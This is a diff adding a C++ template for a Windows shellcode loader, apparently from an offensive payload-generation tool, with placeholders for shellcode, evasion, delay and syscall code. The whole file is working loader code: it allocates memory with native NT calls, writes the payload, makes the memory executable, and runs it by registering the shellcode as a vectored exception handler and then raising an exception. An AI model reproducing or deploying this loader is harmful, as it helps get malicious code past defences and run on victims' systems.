@@ -1,0 +1,88 @@
+#include <iostream>
+#include <windows.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <tchar.h>
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+// Global variables
+PVOID g_ShellcodeAddress = NULL;
+SIZE_T g_ShellcodeSize = 0;
+BOOL g_ExecutionComplete = FALSE;
+
+
+DWORD WINAPI esc_main(LPVOID lpParameter)
+{
+    DWORD dwSize;
+    //HANDLE currentProcess;
+
+    unsigned char encoded[] = ####SHELLCODE####;
+    SIZE_T length = sizeof(encoded);
+
+
+    //####CALL####
+    unsigned char* decoded = encoded;
+
+
+    //####SYSCALL####
+    HANDLE hProc = GetCurrentProcess();
+    DWORD oldProtect = 0;
+    PVOID base_addr = NULL;
+    SIZE_T bytesWritten;
+    SIZE_T pnew = length;
+    NTSTATUS status;
+
+    // Allocate memory for shellcode
+    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (status != 0) {
+        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Write shellcode to allocated memory
+    status = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
+    if (status != 0) {
+        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
+
+    }
+
+    // Change memory protection to executable
+    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&pnew, PAGE_EXECUTE_READ, &oldProtect);
+    if (status != 0) {
+        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    std::cout << "Executing shellcode using Vectored Exception Handler..." << std::endl;
+
+    // Register vectored exception handler pointing to shellcode
+    PVOID handler = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)base_addr);
+    if (!handler) {
+        std::cerr << "AddVectoredExceptionHandler failed with error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Trigger exception to execute handler
+    RaiseException(0x41414141, 0, 0, NULL);
+
+    // Remove handler after execution
+    RemoveVectoredExceptionHandler(handler);
+
+    std::cout << "Execution completed" << std::endl;
+    return 0;
+}
+
+int main()
+{
+    //####DELAY####
+    //####EVASION####
+    //####ARGS####
+
+    esc_main(NULL);
+}
